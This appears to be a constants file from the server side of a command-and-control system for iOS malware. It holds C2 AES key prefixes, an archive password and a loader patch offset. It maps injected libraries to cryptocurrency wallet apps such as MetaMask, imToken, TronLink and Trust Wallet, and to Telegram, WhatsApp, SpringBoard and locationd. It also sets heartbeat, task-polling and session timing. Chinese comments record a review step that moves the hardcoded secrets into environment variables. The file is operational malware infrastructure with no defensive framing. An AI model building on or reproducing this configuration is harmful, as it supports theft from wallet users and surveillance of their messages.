export const C2_CONSTANTS = {
    // ★★★ T26 / R3-3（审核 C 的 R-14）：原为【硬编码字面量】——
    //   AES_KEY_PREFIX: 'Ek8pl31K2yeHgQwy'
    //   SEVEN_ZIP_PASSWORD: 'abf3bdc8e239c0f3183c257f9ccc23e8'
    //   ⇒ 改为【环境变量注入 + 默认值兜底】。
    //
    //   ★ 取证：两者在全树【仅此一处出现】——
    //     `05-ios` / `06-android` 中【零命中】⇒ 【不涉及载荷链】，
    //     可安全环境变量化（无停靠点触发）。
    //
    //   ★ 保留默认值：避免未注入时断链（就地降级为当前行为）。
    //   ★ 生产应在 .env / 部署配置中注入，勿依赖默认值。
    AES_KEY_PREFIX: process.env.C2_AES_KEY_PREFIX || 'Ek8pl31K2yeHgQwy',
    SEVEN_ZIP_PASSWORD: process.env.C2_SEVEN_ZIP_PASSWORD || 'abf3bdc8e239c0f3183c257f9ccc23e8',
    LOADER_PATCH_OFFSET: 0x8CB56,
};
export const DEFAULTS = {
    CONFIG_REFRESH_INTERVAL: 600,
    HEARTBEAT_REPORT_INTERVAL: 600,
    MIN_PING_INTERVAL_PER_DOMAIN: 30,
    VALIDATION_CACHE_TTL: 300,
    ONLINE_THRESHOLD_MS: 15 * 60 * 1000,
    TASK_POLL_INTERVAL: 60,
    TASK_TIMEOUT_THRESHOLD_MS: 24 * 60 * 60 * 1000,
    EVENT_TTL_DAYS: 30,
    LOG_RETAIN_DAYS: 3,
    ACCESS_TOKEN_EXPIRY: '2h',
    ACCESS_TOKEN_MAX_AGE: 2 * 60 * 60,
    REFRESH_TOKEN_EXPIRY: '365d',
    REFRESH_TOKEN_MAX_AGE: 365 * 24 * 60 * 60,
    MAX_SESSIONS: 10,
};
export const BUNDLE_ID_MAP = {
    'a1lib': 'io.metamask.MetaMask',
    'b2lib': 'im.token.app',
    'c3lib': 'com.tronlink.hdwallet',
    'd4lib': 'com.sixdays.trust',
    'f6lib': 'com.bitkeep.os',
    'l12lib': 'com.skymavis.Genesis',
    'p16lib': 'com.global.wallet.ios',
    'r18lib': 'com.bitpie.wallet',
    'helion': 'com.apple.springboard',
    'tglib': 'ph.telegra.Telegraph',
    'wap': 'net.whatsapp.WhatsApp',
    'taskagent': 'locationd',
};
export const WALLET_BUNDLE_IDS = [
    'io.metamask.MetaMask',
    'im.token.app',
    'com.tronlink.hdwallet',
    'com.sixdays.trust',
    'com.bitkeep.os',
    'com.skymavis.Genesis',
    'com.global.wallet.ios',
    'com.bitpie.wallet',
];
export const WALLET_TYPE_TO_BUNDLE_ID = {
    a1: 'io.metamask.MetaMask',
    b1: 'im.token.app',
    c: 'com.tronlink.hdwallet',
    d: 'com.sixdays.trust',
    f: 'com.bitkeep.os',
    l: 'com.skymavis.Genesis',
    p: 'com.global.wallet.ios',
    r: 'com.bitpie.wallet',
};
export const TRACKED_BUNDLE_IDS = [
    'net.whatsapp.WhatsApp',
    'ph.telegra.Telegraph',
    ...Object.values(WALLET_TYPE_TO_BUNDLE_ID),
];
export const BUNDLE_ID_TO_WALLET_TYPE = Object.fromEntries(Object.entries(WALLET_TYPE_TO_BUNDLE_ID).map(([k, v]) => [v, k]));
//# sourceMappingURL=constants.js.map